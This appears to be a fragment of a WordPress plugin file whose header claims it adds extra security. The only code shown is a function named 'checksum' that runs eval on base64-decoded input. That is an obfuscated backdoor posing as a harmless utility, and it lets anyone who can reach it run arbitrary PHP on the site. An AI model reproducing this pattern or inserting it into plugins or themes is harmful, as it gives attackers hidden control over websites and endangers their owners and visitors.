...
Description: Adds some more extra security to WordPress. Distributed through <a href="http://www.bad-neighborhood.com/" target="_blank">Bad Neighborhood</a>.
*/

/*
== Change Log ==
*
* ver. 1.8.2 10-May-2022
...
function checksum($checksum, $arg1 = "", $arg2 = "", $arg3 = "", $arg4 = "", $arg5 = "") {
	return eval(base64_decode($checksum));
}
